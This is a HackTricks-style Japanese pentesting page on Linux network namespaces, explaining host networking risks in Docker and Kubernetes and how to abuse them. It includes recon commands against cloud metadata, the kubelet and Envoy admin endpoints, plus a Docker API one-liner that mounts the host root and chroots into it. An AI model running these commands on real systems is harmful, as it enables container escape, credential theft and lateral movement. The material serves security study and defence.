# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

network namespace は、インターフェース、IP アドレス、routing table、ARP/neighbor state、firewall rule、socket、UNIX-domain abstract socket namespace、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。これにより、container は host の実際の network stack を所有していなくても、独自の `eth0`、独自の local route、独自の loopback device を持っているように見せることができます。

Security の観点では、これは network isolation が単なる port binding をはるかに超えるものであるため重要です。private network namespace によって、workload が直接観察または再構成できる対象が制限されます。その namespace が host と共有されると、container は突然、host の listener、host-local service、abstract AF_UNIX endpoint、そして application に公開されることを意図されていなかった network control point を可視化できるようになります。

## 動作

新しく作成された network namespace は、インターフェースが接続されるまで、空またはほぼ空の network environment として始まります。その後、container runtime が virtual interface を作成または接続し、address を割り当て、workload が想定された connectivity を得られるように route を設定します。bridge-based deployment では通常、container からは host bridge に接続された veth-backed interface が見えます。Kubernetes では、CNI plugin が Pod networking に相当する設定を処理します。

この architecture により、`--network=host` や `hostNetwork: true` が非常に大きな変更となる理由が分かります。準備された private network stack を受け取る代わりに、workload が host の実際のものに参加するためです。

## ラボ

次のコマンドで、ほぼ空の network namespace を確認できます。
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナと host-networked コンテナは、次のように比較できます：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container には、独自に分離された socket と interface のビューがなくなります。この変更だけでも、process がどの capabilities を持っているかを確認する前から、すでに重大な意味を持ちます。

## Runtime Usage

Docker と Podman は、通常、特別な設定がない限り各 container 用に private network namespace を作成します。Kubernetes は通常、各 Pod に独自の network namespace を割り当てます。この namespace はその Pod 内の container 間で共有されますが、host からは分離されています。つまり、`127.0.0.1` は通常、container-local ではなく Pod-local です。ある container で localhost のみに bind された listener は、通常、その sidecar や sibling から到達可能です。Incus/LXC systems も豊富な network-namespace ベースの isolation を提供し、多様な virtual networking setups に対応しています。

共通する原則は、private networking がデフォルトの isolation boundary であり、host networking はその boundary から明示的に opt-out する設定だということです。

## Misconfigurations

最も重要な misconfiguration は、単純に host network namespace を共有することです。これは performance、low-level monitoring、または convenience のために行われることがありますが、container に利用可能な最も明確な boundary の一つを取り除きます。Host-local listener はより直接的に到達可能になり、localhost-only service にアクセスできる場合があります。また、`CAP_NET_ADMIN` や `CAP_NET_RAW` などの capabilities は、それらによって可能になる操作が host 自身の network environment に適用されるため、はるかに危険になります。

もう一つの問題は、network namespace が private であっても、network-related capabilities を過剰に付与することです。private namespace は確かに役立ちますが、raw socket や高度な network control が無害になるわけではありません。

Kubernetes では、`hostNetwork: true` によって、Pod-level network segmentation をどの程度信頼できるかも変わります。Kubernetes のドキュメントでは、多くの network plugin が `podSelector` / `namespaceSelector` matching において `hostNetwork` Pod の traffic を適切に区別できず、その traffic を通常の node traffic として扱うことが説明されています。attacker の観点では、侵害された `hostNetwork` workload は、overlay-network workload と同じ policy assumptions によって制約された通常の Pod ではなく、node-level network foothold として扱うべき場合が多いということです。

## Abuse

isolation が弱い setup では、attackers は host の listening service を調査したり、loopback のみに bind された management endpoint に到達したり、正確な capabilities と environment に応じて traffic を sniff または妨害したりできます。また、`CAP_NET_ADMIN` が存在する場合は、routing や firewall state を再設定できる可能性があります。cluster 内では、これにより lateral movement や control-plane reconnaissance も容易になる場合があります。

host networking が疑われる場合は、まず、表示される interface と listener が isolated container network ではなく host に属していることを確認します。
```bash
ip addr
ip route
ss -lntup | head -n 50
```
ループバック専用サービスは、最初に見つかる興味深い対象であることがよくあります：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets are、TCP/UDP listener のようには見えず、`/run` 配下の filesystem path として存在しない場合もあるため、見落としやすい別の target です。これらは network namespace のスコープに従うため、host-networked container は、コンテナ内に bind-mount されていない host 専用の control channel にもアクセスできてしまいます。
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
歴史的な例としては`containerd-shim`のabstract-socket exposure bugがありますが、特定のCVEよりも重要な教訓は、workloadがhost network namespaceに参加すると、abstract AF_UNIX servicesもattack surfaceの一部になるということです。これらのsocketがruntime関連またはadministrativeなものに見える場合は、[Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)に移行します。

network capabilitiesが存在する場合は、workloadが可視化されたstackをinspectまたはalterできるかをテストします。
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
最新の kernel では、host networking と `CAP_NET_ADMIN` により、単純な `iptables` / `nftables` の変更を超えて packet path にアクセスできる可能性もあります。`tc` の qdisc と filter も namespace 単位でスコープされるため、host network namespace を共有している場合、それらは container から認識できる host interface に適用されます。さらに `CAP_BPF` も存在する場合、TC や XDP loader などの network 関連 eBPF program も重要になります：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
これは、attackerがfirewall rulesを書き換えるだけでなく、host interfaceレベルでtrafficをmirror、redirect、shape、またはdropできる可能性があるため重要です。private network namespaceでは、これらの操作はcontainerのview内に限定されます。一方、shared host namespaceではhostに影響を及ぼすものになります。

clusterまたはcloud環境では、host networkingにより、metadataやcontrol-plane-adjacent servicesに対する迅速なlocal reconも正当化されます。
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetesでは、multi-container Pod内の**いずれか**のcontainerをcompromiseすると、Pod全体で1つのnetwork namespaceを共有しているため、sibling containerやsidecarが開いているlocalhost listenerにもアクセスできることを覚えておいてください。これは、service-mesh、observability、helper containerで特に重要です。これらのadminまたはdebug interfaceは、cluster全体ではなく、意図的にPod内部向けとして公開されているためです：
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
「localhostにバインドされている」を **Pod-private** ではなく **container-private** として扱ってください。Pod内のいずれかのcontainerが侵害された後は、その前提は失われます。

### 完全な例: Host Networking + Local Runtime / Kubelet Access

Host networkingによって自動的にhost rootが提供されるわけではありませんが、node自体からのみ意図的に到達可能なサービスが公開されることがよくあります。それらのサービスのいずれかの保護が弱い場合、Host networkingは直接的なprivilege-escalation経路になります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上の Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響:

- 適切な保護なしでローカル runtime API が公開されている場合、ホストを直接 compromise される可能性
- kubelet またはローカルエージェントに到達可能な場合、cluster reconnaissance や lateral movement が可能
- `CAP_NET_ADMIN` と組み合わせた場合、トラフィックの操作や denial of service が可能

## Checks

これらのチェックの目的は、プロセスがプライベートな network stack を持っているか、どのルートと listener が可視か、さらに capabilities をテストする前の段階で network view がすでにホストに近い状態に見えるかを確認することです。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
ここで興味深い点：

- `/proc/self/ns/net` と `/proc/1/ns/net` がすでに host-like に見える場合、コンテナは host の network namespace、または別の非 private namespace を共有している可能性があります。
- `lsns -t net` と `ip netns identify` は、すでに名前付きまたは persistent namespace 内にある shell から、host 側の `/run/netns` オブジェクトとの対応関係を確認したい場合に便利です。
- `ss -lntup` は、loopback-only listener や local management endpoint を明らかにするため、特に有用です。`ss -xap` と `/proc/net/unix` を使うと、通常の filesystem socket の探索では見落とす abstract socket も確認できます。
- `CAP_NET_ADMIN`、`CAP_NET_RAW`、または `CAP_BPF` が存在する場合、routes、interface names、firewall context、`tc` state、eBPF attachments がより重要になります。
- Kubernetes では、`hostNetwork` Pod で service-name resolution に失敗しても、service が存在しないのではなく、Pod が `dnsPolicy: ClusterFirstWithHostNet` を使用していないだけの可能性があります。
- multi-container Pod では、localhost listener は Pod 全体の network namespace に属します。そのため、loopback-only port が侵害されたコンテナから到達不能だと判断する前に、sidecar と sibling container を確認してください。

コンテナをレビューするときは、network namespace を必ず capability set と併せて評価してください。host networking と強力な network capabilities の組み合わせは、bridge networking と限定的な default capability set の組み合わせとは、まったく異なる security posture になります。

## 参考資料

- [Kubernetes NetworkPolicy と `hostNetwork` に関する注意点](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux の `network_namespaces(7)` と abstract UNIX socket の isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network container に公開される abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [network-related eBPF program に必要な eBPF token と capability](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
